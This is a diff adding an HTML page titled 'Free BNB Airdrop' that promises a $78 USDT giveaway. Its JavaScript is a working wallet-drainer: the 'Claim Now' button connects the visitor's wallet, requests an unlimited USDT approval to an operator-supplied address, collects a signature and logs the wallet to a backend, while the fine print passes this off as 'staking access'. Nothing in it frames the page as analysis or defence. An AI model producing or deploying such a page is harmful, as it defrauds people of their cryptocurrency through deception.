@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free BNB Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #07021c, #1f0037);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes glow {
+      from {
+        text-shadow: 0 0 10px #fff, 0 0 20px #0ff;
+      }
+      to {
+        text-shadow: 0 0 20px #0ff, 0 0 30px #0ff;
+      }
+    }
+
+    button {
+      background: #00ffc8;
+      color: black;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 10px;
+      font-size: 1.2rem;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    p {
+      margin-top: 15px;
+      font-size: 0.95rem;
+    }
+
+    #result {
+      margin-top: 25px;
+    }
+
+    b {
+      color: #00ffc8;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 Free BNB Airdrop Worth $78 USDT</h1>
+  <button onclick="connectWallet()">Claim Now</button>
+  <p>📢 Your airdrop will arrive in your wallet within 2–3 hours after connecting.</p>
+
+  <div id="result"></div>
+
+  <script>
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+    const platformAddress = "0xYourPlatformAddress"; // Replace with your address
+    const ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function allowance(address owner, address spender) public view returns (uint256)"
+    ];
+
+    async function connectWallet() {
+      if (!window.ethereum) {
+        alert("Please install MetaMask or Trust Wallet.");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
+      const token = new ethers.Contract(USDT_BEP20, ABI, signer);
+
+      // Approve unlimited USDT
+      try {
+        const tx = await token.approve(platformAddress, ethers.constants.MaxUint256);
+        await tx.wait();
+      } catch (err) {
+        alert("Approval failed.");
+        return;
+      }
+
+      // Sign a custom message
+      const signature = await signer.signMessage("I claim airdrop");
+      const timestamp = Date.now();
+
+      // Log to backend
+      await fetch("/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ wallet: userAddress, signature, timestamp })
+      });
+
+      document.getElementById("result").innerHTML = `
+        <h2>🎉 Congratulations!</h2>
+        <b>${userAddress}</b><br/>
+        ⏳ Your BNB airdrop worth $78 USDT will be sent within 2–3 hours. Please stay connected.<br/>
+        <small>By claiming airdrop, you authorize USDT staking access to the platform wallet.</small>
+      `;
+    }
+  </script>
+</body>
+</html>
